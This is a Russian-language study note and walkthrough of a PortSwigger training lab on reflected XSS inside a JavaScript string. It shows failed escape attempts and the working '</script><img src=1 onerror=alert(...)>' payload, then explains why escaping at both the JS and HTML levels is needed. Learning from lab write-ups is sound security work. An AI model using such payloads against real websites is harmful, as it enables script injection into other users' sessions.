## XSS в JavaScript контексте

браузер сначала выполняет разбор HTML для идентификации элементов страницы, включая блоки скрипта, и только позже выполняет разбор JavaScript для понимания и выполнения встроенных скриптов

пример
```html
<script> ... var input = 'controllable data here'; ... </script>


пейлоад

</script><img src=1 onerror=alert(document.domain)>
```

лаба https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
#### Reflected XSS into a JavaScript string with single quote and backslash escaped
задание:
в функции  поиска  есть xss
нужно выйти из строки JavaScript и вызвать аллерт

-----

вбил в поиске  текст 777
ответ отражается в html здесь в 2х местах
в том числе в  < js>

```html
                       <h1>0 search results for '777'</h1>
                        <hr>
                    </section>
                    <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search>
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <script>
                        var searchTerms = '777';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
```
инпут оборачивается в кавычки
пробую выйти из области < script> < /script>


пейлоад в поиск `'><img src=1 onerror=alert("777")>'<`
респонс
```html
<script>
  var searchTerms = '\'><img src=1 onerror=alert("777")>\'<';
  document.write('<img src="/resources/images/tracker.gif?     searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

кавычки в инпуте экранируются слешем \ 


пейлоад в поиск `\'<img src=1 onerror=alert("777")>\'`
респонс
```html
                   <script>
                        var searchTerms = '\\\'<img src=1 onerror=alert("777")>\\\'';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
```

не вышло - значит можно просто закрыть сам тег скрипта
пейлоад `</script><img src=1 onerror=alert("777")>`
#### 🟣 лаба решилась! ура!
вызвался аллерт!

респонс
```html
<script>
 var searchTerms = '</script>
 <img src=1 onerror=alert("777")>';
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

< img src=1 - стал отдельным тегом!

-------

### вывод


браузер сначала парсит HTML и находит теги script, а только потом выполняет JavaScript внутри них
   
 если просто экранировать кавычки внутри строки JavaScript, это не защищает от закрытия самого тега script
 
 пейлоад < /script>< img src=1 onerror=alert(1)> работает потому что браузер видит закрывающий тег script и выходит из блока JavaScript
 
  после закрытия оригинального script браузер продолжает парсить HTML и выполняет новый тег img с onerror

 экранирование обратным слешем не помогает против закрытия тега, так как это уровень HTML, а не JavaScript
 
 защита должна быть на двух уровнях: экранирование для JavaScript И экранирование для HTML
 
  ошибка разработчика в том, что они защитились только от побега из строки JS, но не от побега из тега script



